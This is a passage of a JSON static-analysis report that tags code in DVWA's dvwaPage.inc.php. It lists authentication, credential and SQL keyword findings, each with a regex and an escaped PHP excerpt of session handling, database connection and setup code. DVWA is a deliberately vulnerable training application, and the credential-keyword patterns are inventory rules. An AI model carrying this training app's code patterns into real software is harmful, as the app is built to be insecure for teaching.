          "Authentication.General"
        ],
        "sample": "Logout",
        "excerpt": "\n\tif( dvwaIsLoggedIn() ) {\n\t\t$menuBlocks[ &#39;logout&#39; ] = array();\n\t\t$menuBlocks[ &#39;logout&#39; ][] = array( &#39;id&#39; =&gt; &#39;logout&#39;, &#39;name&#39; =&gt; &#39;Logout&#39;, &#39;url&#39; =&gt; &#39;logout.php&#39; );\n\t}\n\n\t$menuHtml = &#39;&#39;;\n\n\tforeach( $menuBlocks as $menuBlock ) {\n",
        "startLocationLine": 224,
        "startLocationColumn": 67,
        "endLocationLine": 224,
        "endLocationColumn": 73
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "logout",
        "excerpt": "\n\tif( dvwaIsLoggedIn() ) {\n\t\t$menuBlocks[ &#39;logout&#39; ] = array();\n\t\t$menuBlocks[ &#39;logout&#39; ][] = array( &#39;id&#39; =&gt; &#39;logout&#39;, &#39;name&#39; =&gt; &#39;Logout&#39;, &#39;url&#39; =&gt; &#39;logout.php&#39; );\n\t}\n\n\t$menuHtml = &#39;&#39;;\n\n\tforeach( $menuBlocks as $menuBlock ) {\n",
        "startLocationLine": 224,
        "startLocationColumn": 86,
        "endLocationLine": 224,
        "endLocationColumn": 92
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "\nfunction dvwaLogin( $pUsername ) {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n\t$dvwaSession[ &#39;username&#39; ] = $pUsername;\n}\n\n\nfunction dvwaIsLoggedIn() {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n",
        "startLocationLine": 95,
        "startLocationColumn": 17,
        "endLocationLine": 95,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "\nfunction dvwaIsLoggedIn() {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n\treturn isset( $dvwaSession[ &#39;username&#39; ] );\n}\n\n\nfunction dvwaLogout() {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n",
        "startLocationLine": 101,
        "startLocationColumn": 31,
        "endLocationLine": 101,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "\nfunction dvwaLogout() {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n\tunset( $dvwaSession[ &#39;username&#39; ] );\n}\n\n\nfunction dvwaPageReload() {\n\tdvwaRedirect( $_SERVER[ &#39;PHP_SELF&#39; ] );\n",
        "startLocationLine": 107,
        "startLocationColumn": 24,
        "endLocationLine": 107,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "\nfunction dvwaCurrentUser() {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n\treturn ( isset( $dvwaSession[ &#39;username&#39; ]) ? $dvwaSession[ &#39;username&#39; ] : &#39;&#39;) ;\n}\n\n// -- END (Session functions)\n\nfunction &amp;dvwaPageNewGrab() {\n",
        "startLocationLine": 117,
        "startLocationColumn": 33,
        "endLocationLine": 117,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "\nfunction dvwaCurrentUser() {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n\treturn ( isset( $dvwaSession[ &#39;username&#39; ]) ? $dvwaSession[ &#39;username&#39; ] : &#39;&#39;) ;\n}\n\n// -- END (Session functions)\n\nfunction &amp;dvwaPageNewGrab() {\n",
        "startLocationLine": 117,
        "startLocationColumn": 63,
        "endLocationLine": 117,
        "endLocationColumn": 71
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Username",
        "excerpt": "\t// -- END (security cookie)\n\n\t$phpIdsHtml   = &#39;&lt;em&gt;PHPIDS:&lt;/em&gt; &#39; . ( dvwaPhpIdsIsEnabled() ? &#39;enabled&#39; : &#39;disabled&#39; );\n\t$userInfoHtml = &#39;&lt;em&gt;Username:&lt;/em&gt; &#39; . ( dvwaCurrentUser() );\n\n\t$messagesHtml = messagesPopAllToHtml();\n\tif( $messagesHtml ) {\n\t\t$messagesHtml = &quot;&lt;div class=\\&quot;body_padded\\&quot;&gt;{$messagesHtml}&lt;/div&gt;&quot;;\n\t}\n",
        "startLocationLine": 258,
        "startLocationColumn": 23,
        "endLocationLine": 258,
        "endLocationColumn": 31
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "$DVWAOS           = &#39;Operating system: &lt;em&gt;&#39; . ( strtoupper( substr (PHP_OS, 0, 3)) === &#39;WIN&#39; ? &#39;Windows&#39; : &#39;*nix&#39; ) . &#39;&lt;/em&gt;&#39;;\n$SERVER_NAME      = &#39;Web Server SERVER_NAME: &lt;em&gt;&#39; . $_SERVER[ &#39;SERVER_NAME&#39; ] . &#39;&lt;/em&gt;&#39;;                                                                                                          // CSRF\n\n$MYSQL_USER       = &#39;MySQL username: &lt;em&gt;&#39; . $_DVWA[ &#39;db_user&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_PASS       = &#39;MySQL password: &lt;em&gt;&#39; . ( ($_DVWA[ &#39;db_password&#39; ] != &quot;&quot; ) ? &#39;******&#39; : &#39;*blank*&#39; ) . &#39;&lt;/em&gt;&#39;;\n$MYSQL_DB         = &#39;MySQL database: &lt;em&gt;&#39; . $_DVWA[ &#39;db_database&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_SERVER     = &#39;MySQL host: &lt;em&gt;&#39; . $_DVWA[ &#39;db_server&#39; ] . &#39;&lt;/em&gt;&#39;;\n// -- END (Setup Functions)\n\n",
        "startLocationLine": 574,
        "startLocationColumn": 28,
        "endLocationLine": 574,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "$SERVER_NAME      = &#39;Web Server SERVER_NAME: &lt;em&gt;&#39; . $_SERVER[ &#39;SERVER_NAME&#39; ] . &#39;&lt;/em&gt;&#39;;                                                                                                          // CSRF\n\n$MYSQL_USER       = &#39;MySQL username: &lt;em&gt;&#39; . $_DVWA[ &#39;db_user&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_PASS       = &#39;MySQL password: &lt;em&gt;&#39; . ( ($_DVWA[ &#39;db_password&#39; ] != &quot;&quot; ) ? &#39;******&#39; : &#39;*blank*&#39; ) . &#39;&lt;/em&gt;&#39;;\n$MYSQL_DB         = &#39;MySQL database: &lt;em&gt;&#39; . $_DVWA[ &#39;db_database&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_SERVER     = &#39;MySQL host: &lt;em&gt;&#39; . $_DVWA[ &#39;db_server&#39; ] . &#39;&lt;/em&gt;&#39;;\n// -- END (Setup Functions)\n\n?&gt;\n",
        "startLocationLine": 575,
        "startLocationColumn": 28,
        "endLocationLine": 575,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\nfunction dvwaLogin( $pUsername ) {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n\t$dvwaSession[ &#39;username&#39; ] = $pUsername;\n}\n\n\nfunction dvwaIsLoggedIn() {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n",
        "startLocationLine": 95,
        "startLocationColumn": 17,
        "endLocationLine": 95,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\nfunction dvwaIsLoggedIn() {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n\treturn isset( $dvwaSession[ &#39;username&#39; ] );\n}\n\n\nfunction dvwaLogout() {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n",
        "startLocationLine": 101,
        "startLocationColumn": 31,
        "endLocationLine": 101,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\nfunction dvwaLogout() {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n\tunset( $dvwaSession[ &#39;username&#39; ] );\n}\n\n\nfunction dvwaPageReload() {\n\tdvwaRedirect( $_SERVER[ &#39;PHP_SELF&#39; ] );\n",
        "startLocationLine": 107,
        "startLocationColumn": 24,
        "endLocationLine": 107,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\nfunction dvwaCurrentUser() {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n\treturn ( isset( $dvwaSession[ &#39;username&#39; ]) ? $dvwaSession[ &#39;username&#39; ] : &#39;&#39;) ;\n}\n\n// -- END (Session functions)\n\nfunction &amp;dvwaPageNewGrab() {\n",
        "startLocationLine": 117,
        "startLocationColumn": 33,
        "endLocationLine": 117,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\nfunction dvwaCurrentUser() {\n\t$dvwaSession =&amp; dvwaSessionGrab();\n\treturn ( isset( $dvwaSession[ &#39;username&#39; ]) ? $dvwaSession[ &#39;username&#39; ] : &#39;&#39;) ;\n}\n\n// -- END (Session functions)\n\nfunction &amp;dvwaPageNewGrab() {\n",
        "startLocationLine": 117,
        "startLocationColumn": 63,
        "endLocationLine": 117,
        "endLocationColumn": 71
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Username",
        "excerpt": "\t// -- END (security cookie)\n\n\t$phpIdsHtml   = &#39;&lt;em&gt;PHPIDS:&lt;/em&gt; &#39; . ( dvwaPhpIdsIsEnabled() ? &#39;enabled&#39; : &#39;disabled&#39; );\n\t$userInfoHtml = &#39;&lt;em&gt;Username:&lt;/em&gt; &#39; . ( dvwaCurrentUser() );\n\n\t$messagesHtml = messagesPopAllToHtml();\n\tif( $messagesHtml ) {\n\t\t$messagesHtml = &quot;&lt;div class=\\&quot;body_padded\\&quot;&gt;{$messagesHtml}&lt;/div&gt;&quot;;\n\t}\n",
        "startLocationLine": 258,
        "startLocationColumn": 23,
        "endLocationLine": 258,
        "endLocationColumn": 31
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "$DVWAOS           = &#39;Operating system: &lt;em&gt;&#39; . ( strtoupper( substr (PHP_OS, 0, 3)) === &#39;WIN&#39; ? &#39;Windows&#39; : &#39;*nix&#39; ) . &#39;&lt;/em&gt;&#39;;\n$SERVER_NAME      = &#39;Web Server SERVER_NAME: &lt;em&gt;&#39; . $_SERVER[ &#39;SERVER_NAME&#39; ] . &#39;&lt;/em&gt;&#39;;                                                                                                          // CSRF\n\n$MYSQL_USER       = &#39;MySQL username: &lt;em&gt;&#39; . $_DVWA[ &#39;db_user&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_PASS       = &#39;MySQL password: &lt;em&gt;&#39; . ( ($_DVWA[ &#39;db_password&#39; ] != &quot;&quot; ) ? &#39;******&#39; : &#39;*blank*&#39; ) . &#39;&lt;/em&gt;&#39;;\n$MYSQL_DB         = &#39;MySQL database: &lt;em&gt;&#39; . $_DVWA[ &#39;db_database&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_SERVER     = &#39;MySQL host: &lt;em&gt;&#39; . $_DVWA[ &#39;db_server&#39; ] . &#39;&lt;/em&gt;&#39;;\n// -- END (Setup Functions)\n\n",
        "startLocationLine": 574,
        "startLocationColumn": 28,
        "endLocationLine": 574,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "$SERVER_NAME      = &#39;Web Server SERVER_NAME: &lt;em&gt;&#39; . $_SERVER[ &#39;SERVER_NAME&#39; ] . &#39;&lt;/em&gt;&#39;;                                                                                                          // CSRF\n\n$MYSQL_USER       = &#39;MySQL username: &lt;em&gt;&#39; . $_DVWA[ &#39;db_user&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_PASS       = &#39;MySQL password: &lt;em&gt;&#39; . ( ($_DVWA[ &#39;db_password&#39; ] != &quot;&quot; ) ? &#39;******&#39; : &#39;*blank*&#39; ) . &#39;&lt;/em&gt;&#39;;\n$MYSQL_DB         = &#39;MySQL database: &lt;em&gt;&#39; . $_DVWA[ &#39;db_database&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_SERVER     = &#39;MySQL host: &lt;em&gt;&#39; . $_DVWA[ &#39;db_server&#39; ] . &#39;&lt;/em&gt;&#39;;\n// -- END (Setup Functions)\n\n?&gt;\n",
        "startLocationLine": 575,
        "startLocationColumn": 28,
        "endLocationLine": 575,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT name, comment FROM guestbook&quot;;",
        "excerpt": "\n// XSS Stored guestbook function --\nfunction dvwaGuestbook() {\n\t$query  = &quot;SELECT name, comment FROM guestbook&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query );\n\n\t$guestbook = &#39;&#39;;\n\n\twhile( $row = mysqli_fetch_row( $result ) ) {\n",
        "startLocationLine": 504,
        "startLocationColumn": 12,
        "endLocationLine": 504,
        "endLocationColumn": 51
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\n// Database Management --\n\nif( $DBMS == &#39;MySQL&#39; ) {\n\t$DBMS = htmlspecialchars(strip_tags( $DBMS ));\n\t$DBMS_errorFunc = &#39;mysqli_error()&#39;;\n}\nelseif( $DBMS == &#39;PGSQL&#39; ) {\n\t$DBMS = htmlspecialchars(strip_tags( $DBMS ));\n",
        "startLocationLine": 443,
        "startLocationColumn": 15,
        "endLocationLine": 443,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\t//global $DBMS_connError;\n\tglobal $db;\n\n\tif( $DBMS == &#39;MySQL&#39; ) {\n\t\tif( !@($GLOBALS[&quot;___mysqli_ston&quot;] = mysqli_connect( $_DVWA[ &#39;db_server&#39; ],  $_DVWA[ &#39;db_user&#39; ],  $_DVWA[ &#39;db_password&#39; ] ))\n\t\t|| !@((bool)mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], &quot;USE &quot; . $_DVWA[ &#39;db_database&#39; ])) ) {\n\t\t\t//die( $DBMS_connError );\n\t\t\tdvwaLogout();\n\t\t\tdvwaMessagePush( &#39;Unable to connect to the database.&lt;br /&gt;&#39; . $DBMS_errorFunc );\n",
        "startLocationLine": 469,
        "startLocationColumn": 16,
        "endLocationLine": 469,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\t\t\tdvwaMessagePush( &#39;Unable to connect to the database.&lt;br /&gt;&#39; . $DBMS_errorFunc );\n\t\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;setup.php&#39; );\n\t\t}\n\t\t// MySQL PDO Prepared Statements (for impossible levels)\n\t\t$db = new PDO(&#39;mysql:host=&#39; . $_DVWA[ &#39;db_server&#39; ].&#39;;dbname=&#39; . $_DVWA[ &#39;db_database&#39; ].&#39;;charset=utf8&#39;, $_DVWA[ &#39;db_user&#39; ], $_DVWA[ &#39;db_password&#39; ]);\n\t\t$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\t\t$db-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);\n\t}\n\telseif( $DBMS == &#39;PGSQL&#39; ) {\n",
        "startLocationLine": 477,
        "startLocationColumn": 6,
        "endLocationLine": 477,
        "endLocationColumn": 11
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\t\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;setup.php&#39; );\n\t\t}\n\t\t// MySQL PDO Prepared Statements (for impossible levels)\n\t\t$db = new PDO(&#39;mysql:host=&#39; . $_DVWA[ &#39;db_server&#39; ].&#39;;dbname=&#39; . $_DVWA[ &#39;db_database&#39; ].&#39;;charset=utf8&#39;, $_DVWA[ &#39;db_user&#39; ], $_DVWA[ &#39;db_password&#39; ]);\n\t\t$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\t\t$db-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);\n\t}\n\telseif( $DBMS == &#39;PGSQL&#39; ) {\n\t\t//$dbconn = pg_connect(&quot;host={$_DVWA[ &#39;db_server&#39; ]} dbname={$_DVWA[ &#39;db_database&#39; ]} user={$_DVWA[ &#39;db_user&#39; ]} password={$_DVWA[ &#39;db_password&#39; ])}&quot;\n",
        "startLocationLine": 478,
        "startLocationColumn": 18,
        "endLocationLine": 478,
        "endLocationColumn": 23
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "$phpURLInclude    = &#39;PHP function allow_url_include: &lt;span class=&quot;&#39; . ( ini_get( &#39;allow_url_include&#39; ) ? &#39;success&quot;&gt;Enabled&#39; : &#39;failure&quot;&gt;Disabled&#39; ) . &#39;&lt;/span&gt;&#39;;                                   // RFI\n$phpURLFopen      = &#39;PHP function allow_url_fopen: &lt;span class=&quot;&#39; . ( ini_get( &#39;allow_url_fopen&#39; ) ? &#39;success&quot;&gt;Enabled&#39; : &#39;failure&quot;&gt;Disabled&#39; ) . &#39;&lt;/span&gt;&#39;;                                       // RFI\n$phpGD            = &#39;PHP module gd: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;gd&#39; ) &amp;&amp; function_exists( &#39;gd_info&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing - Only an issue if you want to play with captchas&#39; ) . &#39;&lt;/span&gt;&#39;;                    // File Upload\n$phpMySQL         = &#39;PHP module mysql: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;mysqli&#39; ) &amp;&amp; function_exists( &#39;mysqli_query&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // Core DVWA\n$phpPDO           = &#39;PHP module pdo_mysql: &lt;span class=&quot;&#39; . ( extension_loaded( &#39;pdo_mysql&#39; ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // SQLi\n$DVWARecaptcha    = &#39;reCAPTCHA key: &lt;span class=&quot;&#39; . ( ( isset( $_DVWA[ &#39;recaptcha_public_key&#39; ] ) &amp;&amp; $_DVWA[ &#39;recaptcha_public_key&#39; ] != &#39;&#39; ) ? &#39;success&quot;&gt;&#39; . $_DVWA[ &#39;recaptcha_public_key&#39; ] : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;\n\n$DVWAUploadsWrite = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPUploadPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPUploadPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                     // File Upload\n$bakWritable = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPCONFIGPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPCONFIGPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;   // config.php.bak check                                  // File Upload\n",
        "startLocationLine": 563,
        "startLocationColumn": 33,
        "endLocationLine": 563,
        "endLocationColumn": 38
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
